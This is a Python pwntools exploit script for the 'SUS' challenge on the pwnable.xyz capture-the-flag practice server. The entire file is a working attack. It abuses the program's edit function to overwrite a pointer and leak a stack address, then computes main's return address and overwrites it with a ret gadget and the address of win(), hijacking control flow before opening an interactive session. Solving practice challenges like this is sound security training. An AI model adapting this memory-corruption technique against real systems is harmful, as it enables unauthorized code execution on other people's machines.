# exploit_SUS.py

from pwn import *

# r = process("./SUS")
r = remote("svc.pwnable.xyz", 30011)

addr_win = 0x400b71 # address of win()
addr_cur = 0x602268 # address of variable 'cur'
ret = 0x4006fe # address of "ret" gadget

def cr(name, age):
    r.recvuntil("> ")
    r.send("1")
    r.recvuntil("Name: ")
    r.send(name)
    r.recvuntil("Age: ")
    r.send(age)

def pr():
    r.recvuntil("> ")
    r.send("2")

def ed(name, age):
    r.recvuntil("> ")
    r.send("3")
    r.recvuntil("Name: ")
    r.send(name)
    r.recvuntil("Age: ")
    r.send(age)

def ex():
    r.recvuntil("> ")
    r.send("0")

cr("ChyKor12", "21")
ed("ChyKor12", "A" * 0x10 + p64(addr_cur))

pr()
r.recvuntil("User: ")
stack = u64(r.recv(6).ljust(8, "\x00")) # address of stack memory (where address of chunk was on)
main_ret = stack + 0x1088 # address where return address of main() is on
log.info("return address of main() is on " + hex(main_ret))

ed(p64(stack), "A" * 0x10 + p64(main_ret))
ed(p64(ret) + p64(addr_win), "21")

ex()

r.interactive()